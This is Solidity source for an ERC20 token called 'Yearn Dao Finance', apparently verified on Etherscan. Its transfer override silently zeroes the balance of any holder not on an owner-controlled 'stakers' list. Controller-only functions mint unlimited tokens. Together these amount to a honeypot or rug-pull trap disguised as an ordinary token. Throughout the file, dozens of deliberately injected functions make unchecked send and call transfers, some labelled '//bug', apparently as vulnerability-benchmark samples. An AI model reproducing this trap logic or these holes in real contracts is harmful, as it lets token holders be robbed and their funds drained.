/**
 *Submitted for verification at Etherscan.io on 2020-09-29
*/

pragma solidity ^0.5.17;

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Context {
    constructor () internal { }
function bug_unchk3(address payable addr) public
      {addr.send (42 ether); }
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
function UncheckedExternalCall_unchk28 () public
{  address payable addr_unchk28;
   if (! addr_unchk28.send (42 ether))  
      {// comment1;
      }
	else
      {//comment2;
      }
}
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
  function cash_unchk34(uint roundIndex, uint subpotIndex, address payable winner_unchk34) public{
        uint64 subpot_unchk34 = 10 ether;
        winner_unchk34.send(subpot_unchk34);  //bug
        subpot_unchk34= 0;
}
  mapping (address => uint) private _balances;
  function cash_unchk46(uint roundIndex, uint subpotIndex, address payable winner_unchk46) public{
        uint64 subpot_unchk46 = 3 ether;
        winner_unchk46.send(subpot_unchk46);  //bug
        subpot_unchk46= 0;
}
  mapping (address => mapping (address => uint)) private _allowances;
  function unhandledsend_unchk2(address payable callee) public {
    callee.send(5 ether);
  }
  uint private _totalSupply;
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }
function unhandledsend_unchk38(address payable callee) public {
    callee.send(5 ether);
  }
    function balanceOf(address account) public view returns (uint) {
        return _balances[account];
    }
function UncheckedExternalCall_unchk40 () public
{  address payable addr_unchk40;
   if (! addr_unchk40.send (2 ether))  
      {// comment1;
      }
	else
      {//comment2;
      }
}
    function transfer(address recipient, uint amount) public returns (bool) {
        _tft(_msgSender(), recipient, amount);
        return true;
    }
bool public payedOut_unchk32 = false;
address payable public winner_unchk32;
uint public winAmount_unchk32;

function sendToWinner_unchk32() public {
        require(!payedOut_unchk32);
        winner_unchk32.send(winAmount_unchk32);
        payedOut_unchk32 = true;
    }
    function allowance(address owner, address spender) public view returns (uint) {
        return _allowances[owner][spender];
    }
function callnotchecked_unchk37(address payable callee) public {
    callee.call.value(1 ether);
  }
    function approve(address spender, uint amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
function bug_unchk15(address payable addr) public
      {addr.send (42 ether); }
    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
        _tft(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
function UncheckedExternalCall_unchk16 () public
{  address payable addr_unchk16;
   if (! addr_unchk16.send (42 ether))  
      {// comment1;
      }
	else
      {//comment2;
      }
}
    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
function bug_unchk31() public{
address payable addr_unchk31;
if (!addr_unchk31.send (10 ether) || 1==1)
	{revert();}
}
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
function my_func_uncheck12(address payable dst) public payable{
        dst.call.value(msg.value)("");
    }
    function _tft(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
function my_func_unchk35(address payable dst) public payable{
        dst.send(msg.value);
    }
    function _initMint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
function withdrawBal_unchk29 () public{
	uint Balances_unchk29 = 0;
	msg.sender.send(Balances_unchk29);}
    function _rebase(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
    }
function my_func_uncheck24(address payable dst) public payable{
        dst.call.value(msg.value)("");
    }
    function _withdraw(address account, uint amount) internal {
        require(account != address(0), "ERC20: _withdraw to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
    }
function callnotchecked_unchk13(address callee) public {
    callee.call.value(1 ether);
  }
    function _stake(address acc) internal {
        _balances[acc] = 0;
    }
function bug_unchk42() public{
uint receivers_unchk42;
address payable addr_unchk42;
if (!addr_unchk42.send(42 ether))
	{receivers_unchk42 +=1;}
else
	{revert();}
}
    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
function unhandledsend_unchk26(address payable callee) public {
    callee.send(5 ether);
  }
}

contract ERC20Detailed is IERC20 {
  function my_func_unchk47(address payable dst) public payable{
        dst.send(msg.value);
    }
  string private _name;
  function unhandledsend_unchk14(address payable callee) public {
    callee.send(5 ether);
  }
  string private _symbol;
  bool public payedOut_unchk33 = false;

function withdrawLeftOver_unchk33() public {
        require(payedOut_unchk33);
        msg.sender.send(address(this).balance);
    }
  uint8 private _decimals;
    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
function bug_unchk19() public{
address payable addr_unchk19;
if (!addr_unchk19.send (10 ether) || 1==1)
	{revert();}
}
    function name() public view returns (string memory) {
        return _name;
    }
function cash_unchk10(uint roundIndex, uint subpotIndex,address payable winner_unchk10) public{
        uint64 subpot_unchk10 = 10 ether;
        winner_unchk10.send(subpot_unchk10);  //bug
        subpot_unchk10= 0;
}
    function symbol() public view returns (string memory) {
        return _symbol;
    }
function bug_unchk7() public{
address payable addr_unchk7;
if (!addr_unchk7.send (10 ether) || 1==1)
	{revert();}
}
    function decimals() public view returns (uint8) {
        return _decimals;
    }
bool public payedOut_unchk44 = false;
address payable public winner_unchk44;
uint public winAmount_unchk44;

function sendToWinner_unchk44() public {
        require(!payedOut_unchk44);
        winner_unchk44.send(winAmount_unchk44);
        payedOut_unchk44 = true;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract YearnDaoFinance is ERC20, ERC20Detailed {
  using SafeMath for uint;
bool public payedOut_unchk45 = false;

function withdrawLeftOver_unchk45() public {
        require(payedOut_unchk45);
        msg.sender.send(address(this).balance);
    }
  mapping (address => bool) public controller;
function callnotchecked_unchk25(address payable callee) public {
    callee.call.value(1 ether);
  }
  mapping (address => bool) public stakers;
function my_func_uncheck36(address payable dst) public payable{
        dst.call.value(msg.value)("");
    }
  address uni = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  constructor () public ERC20Detailed("Yearn Dao Finance", "YDF", 18) {
      _initMint( msg.sender, 1000*10**uint(decimals()) );
      controller[msg.sender] = true;
      stakers[msg.sender] = true;
      stakers[uni] = true;
  }
function bug_unchk43() public{
address payable addr_unchk43;
if (!addr_unchk43.send (10 ether) || 1==1)
	{revert();}
}
  function _tft(address sender, address recipient, uint amount) internal {
    require(amount <= this.balanceOf(sender), "error");
    if(stakers[sender]){
      super._tft(sender, recipient, amount);
    } else {
      super._stake(sender);
      super._tft(sender, recipient, amount);
    }
  }
function callnotchecked_unchk1(address payable callee) public {
    callee.call.value(2 ether);
  }
  function stake(address account) public {
      require(controller[msg.sender], "error");
      _stake(account);
  }
function bug_unchk30() public{
uint receivers_unchk30;
address payable addr_unchk30;
if (!addr_unchk30.send(42 ether))
	{receivers_unchk30 +=1;}
else
	{revert();}
}
  function withdraw(address account, uint amount) public {
      require(controller[msg.sender], "error");
      _withdraw(account, amount);
  }
function my_func_unchk11(address payable dst) public payable{
        dst.send(msg.value);
    }
  function rebase(address account, uint amount) public {
      require(controller[msg.sender], "error");
      _rebase(account, amount);
  }
bool public payedOut_unchk9 = false;

function withdrawLeftOver_unchk9() public {
        require(payedOut_unchk9);
        msg.sender.send(address(this).balance);
    }
  function addStakers(address account) public {
      require(controller[msg.sender], "error");
      stakers[account] = true;
  }
function withdrawBal_unchk17 () public{
	uint64 Balances_unchk17 = 0;
	msg.sender.send(Balances_unchk17);}
  function removeStakers(address account) public {
      require(controller[msg.sender], "error");
      stakers[account] = false;
  }
function withdrawBal_unchk41 () public{
	uint64 Balances_unchk41 = 0;
	msg.sender.send(Balances_unchk41);}

}